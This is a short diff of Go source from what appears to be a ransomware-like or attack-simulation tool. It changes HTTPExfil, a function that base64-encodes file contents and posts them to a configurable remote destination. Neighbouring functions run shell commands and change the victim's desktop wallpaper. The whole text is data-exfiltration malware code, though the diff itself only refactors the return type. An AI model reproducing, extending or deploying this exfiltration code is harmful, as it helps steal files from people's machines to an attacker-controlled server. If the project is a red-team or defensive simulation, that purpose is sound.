@@ -259,8 +259,11 @@ func executeShell(shell string, cmds []string) (string, error) {
 
 // HTTPExfil will return a function pointer to an ExfilFunc that
 // exfils via HTTP POST requests with the specified headers.
-func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
-	return func(path string, b []byte) error {
+func HTTPExfil(
+	dst string,
+	headers map[string]string,
+) (ExfilFunc, error) {
+	var f ExfilFunc = func(path string, b []byte) error {
 		var b64 string
 		var data []byte
 		var e error
@@ -286,6 +289,8 @@ func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
 			http.Post(dst, headers, data)
 		}
 	}
+
+	return f, nil
 }
 
 // WallpaperNotify is a NotifyFunc that sets the background wallpaper.
